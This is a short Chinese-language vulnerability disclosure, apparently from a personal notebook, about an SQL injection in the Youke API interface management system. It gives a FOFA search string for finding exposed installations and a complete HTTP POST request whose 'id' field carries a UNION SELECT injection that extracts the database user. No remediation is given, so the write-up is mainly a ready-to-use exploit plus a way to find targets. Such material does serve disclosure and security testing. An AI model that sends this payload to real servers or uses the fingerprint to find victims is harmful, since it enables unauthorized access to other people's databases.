# 优客API接口管理系统存在SQL注入漏洞

# 一、漏洞简介
优客API接口管理系统，内置30+API接口，支持服务器信息，网站ICP备案，抖音无水印，QQ在线状态QQ头像，获取历史上的今天，IP签名档，ICO站标获，随机动漫图，网站标题获取，爱站权重获取，城市天气获取，随机一言，皮皮虾无水印，每日Bing壁纸，垃圾分类，查询手机号归属地，申通快递查询等接口功能。优客API接口管理系统存在SQL注入漏洞

# 二、影响版本
+ 优客API接口管理系统

# 三、资产测绘
+ fofa

```plain
"public/static/index/css/flaghome.css"
```

+ 特征

![1731383630664-4e1345d0-9673-4677-bcc6-1ca61d9895ab.png](./img/TRHl7koVp2Qt2mXm/1731383630664-4e1345d0-9673-4677-bcc6-1ca61d9895ab-780835.png)

# 四、漏洞复现
```plain
POST /index/index/doc HTTP/1.1
Host: 
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Connection: close

id=') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(IFNULL(CAST(CURRENT_USER() AS NCHAR),0x20)),NULL-- -
```

![1731383899209-0422239d-a29b-46dd-8538-6b6be399667b.png](./img/TRHl7koVp2Qt2mXm/1731383899209-0422239d-a29b-46dd-8538-6b6be399667b-371311.png)



> 更新: 2024-11-27 10:00:07  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/xphkgwr0lgod5047>